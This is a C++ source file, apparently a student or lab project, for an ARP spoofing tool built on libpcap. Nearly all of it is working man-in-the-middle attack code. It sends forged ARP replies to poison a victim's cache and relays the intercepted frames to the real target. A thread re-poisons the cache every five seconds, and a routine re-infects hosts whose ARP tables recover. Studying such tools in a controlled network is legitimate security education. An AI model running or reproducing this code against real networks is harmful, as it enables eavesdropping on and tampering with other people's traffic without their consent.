#include "arp-spoof.h"
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <pthread.h>
#include <unistd.h>

Mac myMac;
Ip myIp;
pcap_t* pcap;
std::vector<SpoofPair> spoofpairs;

bool getMyInfo(const char* ifname) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket()");
        return false;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    // Get MAC
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sockfd);
        return false;
    }
    myMac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

    // Get IP
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sockfd);
        return false;
    }
    struct sockaddr_in* sin = (struct sockaddr_in*)&ifr.ifr_addr;
    myIp = Ip(ntohl(sin->sin_addr.s_addr));

    close(sockfd);

    return true;
}

bool getMac(pcap_t* pcap, Mac& mac, Ip ip) {
    time_t start = time(nullptr);
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_  = htonl(myIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(ip);

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    while (true) {
        if (time(nullptr) - start > 5) {
            fprintf(stderr, "[-] Timeout: no ARP reply received from %s\n", std::string(ip).c_str());
            return false;
        }

        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(pcap, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthHdr* r_eth = (EthHdr*)recv_packet;
        if (ntohs(r_eth->type_) != EthHdr::Arp) continue;

        ArpHdr* r_arp = (ArpHdr*)(recv_packet + sizeof(EthHdr));
        if (ntohs(r_arp->op_) != ArpHdr::Reply) continue;
        if (r_arp->sip() != ip) continue;

        mac = r_arp->smac();
        return true;
    }

    return false;
}

bool sendArpSpoof(const SpoofPair& spoofpair) {
    EthArpPacket packet;

    packet.eth_.dmac_ = spoofpair.senderMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_  = htonl(spoofpair.targetIp);
    packet.arp_.tmac_ = spoofpair.senderMac;
    packet.arp_.tip_  = htonl(spoofpair.senderIp);

    if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
        return false;
    }
    return true;
}

void relayPacket(const u_char* packet, int packetLen) {
    EthHdr* eth = (EthHdr*)packet;

    for (const SpoofPair& spoofpair : spoofpairs) {
        if (eth->smac() == spoofpair.senderMac && eth->dmac() == myMac) {

            EthHdr* newEth = (EthHdr*)malloc(packetLen);
            memcpy(newEth, packet, packetLen);
            newEth->smac_ = myMac;
            newEth->dmac_ = spoofpair.targetMac;

            pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(newEth), packetLen);
            free(newEth);
            break;
        }
    }
}

void* infectThread(void* arg) {
    while (true) {
        for (const SpoofPair& spoofpair : spoofpairs) {
            sendArpSpoof(spoofpair);
        }
        sleep(5);
    }
    return nullptr;
}

void detectRecoverAndReinfect(const u_char* packet, int packetLen) {
    EthHdr* eth = (EthHdr*)packet;

    if (ntohs(eth->type_) != EthHdr::Arp) return;

    ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));

    if (ntohs(arp->op_) != ArpHdr::Reply) return;

    Ip sender_ip = arp->sip();
    Mac sender_mac = arp->smac();

    for (const SpoofPair& spoofpair : spoofpairs) {
        if (sender_ip == spoofpair.senderIp) {
            if (sender_mac != myMac) {
                printf("[!] Detected recover from %s. Re-infecting...\n", std::string(sender_ip).c_str());
                sendArpSpoof(spoofpair);
            }
        }
    }
}

